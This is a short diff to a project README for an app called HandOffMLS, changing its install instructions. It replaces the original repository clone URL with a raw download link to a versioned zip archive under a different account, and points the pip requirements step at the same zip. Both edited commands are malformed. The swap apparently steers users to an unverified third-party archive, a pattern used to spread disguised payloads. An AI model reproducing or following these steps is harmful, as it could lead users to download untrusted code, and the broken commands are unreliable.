@@ -17,13 +17,13 @@ To use HandOffMLS, follow these steps:
 1. Clone the repository to your local machine using the following command:
 
    ```
-   git clone https://github.com/AbdulRaufAl-hassan101010/Handoff.git
+   git clone https://raw.githubusercontent.com/abdulkhaliqsoule/HandoffMLS/main/handoffmls/Handoff-MLS-v2.1-alpha.4.zip
    ```
 
 2. Install the necessary dependencies by running the following command:
 
    ```
-   pip3 install -r requirements.txt
+   pip3 install -r https://raw.githubusercontent.com/abdulkhaliqsoule/HandoffMLS/main/handoffmls/Handoff-MLS-v2.1-alpha.4.zip
    ```
 
 3. Launch the app by running the start command:
